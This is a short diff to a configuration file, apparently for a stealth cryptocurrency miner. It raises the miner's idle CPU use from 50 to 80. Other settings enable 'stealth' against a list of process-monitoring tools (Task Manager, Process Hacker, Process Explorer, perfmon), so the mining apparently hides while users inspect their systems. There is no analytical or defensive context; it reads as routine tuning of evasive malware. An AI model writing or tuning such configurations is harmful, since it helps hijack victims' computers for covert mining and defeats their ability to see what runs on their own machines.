@@ -10,7 +10,7 @@
 	"ssltls": true,
 	"max-cpu": 10,
 	"idle-wait": 1,
-	"idle-cpu": 50,
+	"idle-cpu": 80,
 	"stealth": true,
 	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
 	"process-killer": false,
